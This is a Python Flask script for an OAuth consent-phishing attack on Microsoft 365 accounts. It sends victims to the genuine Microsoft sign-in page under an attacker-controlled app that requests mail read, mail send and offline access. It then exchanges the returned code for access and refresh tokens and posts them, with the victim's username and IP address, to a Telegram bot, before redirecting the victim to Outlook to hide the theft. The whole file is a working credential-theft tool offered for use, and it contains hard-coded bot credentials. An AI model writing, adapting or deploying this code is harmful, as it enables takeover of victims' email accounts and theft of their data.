from flask import Flask, request, redirect
import requests
import urllib.parse
import os
import base64
import json

app = Flask(__name__)

# --- YOUR TELEGRAM DETAILS ---
TELEGRAM_BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
TELEGRAM_CHAT_ID = "8877118461"

# --- MICROSOFT OAUTH SETTINGS ---
# This Client ID is permissive for custom domains
MS_CLIENT_ID = "147947b0-1073-4b4c-88e1-9f7295f29b3f"
MS_REDIRECT_URI = "https://myappsignin.onrender.com/callback"
MS_SCOPE = "openid profile email offline_access Mail.Read Mail.Send"

def send_to_telegram(username, access_token, refresh_token, ip, error_msg=None):
    """Sends the captured keys to your Telegram."""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    
    if error_msg:
        text = f"❌ <b>Phish Failed</b>\n\nIP: {ip}\nError: {error_msg}"
    else:
        text = f"""
🛡️ <b>O365 Session Captured</b>

👤 <b>User:</b> {username}
🌐 <b>IP:</b> {ip}

🔑 <b>ACCESS TOKEN:</b>
<code>{access_token}</code>

🔄 <b>REFRESH TOKEN:</b>
<code>{refresh_token}</code>
"""
    
    requests.post(url, json={
        "chat_id": TELEGRAM_CHAT_ID,
        "text": text,
        "parse_mode": "HTML"
    })

@app.route("/")
def start():
    """Redirects the user to the real Microsoft Login page."""
    params = {
        "client_id": MS_CLIENT_ID,
        "response_type": "code",
        "scope": MS_SCOPE,
        "redirect_uri": MS_REDIRECT_URI,
        "prompt": "select_account"
    }
    ms_url = f"https://login.microsoftonline.com/common/oauth2/authorize?{urllib.parse.urlencode(params)}"
    return redirect(ms_url)

@app.route("/callback")
def callback():
    """Exchanges the code for tokens and sends them to Telegram."""
    auth_code = request.args.get('code', '')
    error = request.args.get('error', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    if error:
        error_description = request.args.get('error_description', 'Unknown Error')
        send_to_telegram("N/A", "N/A", "N/A", ip, f"Error: {error} - {error_description}")
        return redirect("https://outlook.office365.com/")

    if not auth_code:
        send_to_telegram("N/A", "N/A", "N/A", ip, "No code received")
        return redirect("https://outlook.office365.com/")

    token_url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
    data = {
        "client_id": MS_CLIENT_ID,
        "grant_type": "authorization_code",
        "code": auth_code,
        "redirect_uri": MS_REDIRECT_URI,
        "scope": MS_SCOPE
    }
    
    try:
        response = requests.post(token_url, data=data, timeout=10)
        if response.status_code != 200:
            send_to_telegram("N/A", "N/A", "N/A", ip, f"Token Exchange Failed: {response.text}")
            return redirect("https://outlook.office365.com/")
            
        tokens = response.json()
        
        # Extract username from ID Token
        username = "Unknown"
        if "id_token" in tokens:
            try:
                payload = tokens["id_token"].split('.')[1]
                payload += '=' * (4 - len(payload) % 4)
                user_info = json.loads(base64.urlsafe_b64decode(payload))
                username = user_info.get("preferred_username", "Unknown")
            except:
                pass
            
        access_token = tokens.get("access_token", "FAILED")
        refresh_token = tokens.get("refresh_token", "FAILED")
        send_to_telegram(username, access_token, refresh_token, ip)
        
    except Exception as e:
        send_to_telegram("N/A", "N/A", "N/A", ip, f"Exception: {str(e)}")

    return redirect("https://outlook.office365.com/")

if __name__ == "__main__":
    port = int(os.environ.get('PORT', 5000))
    app.run(host="0.0.0.0", port=port)
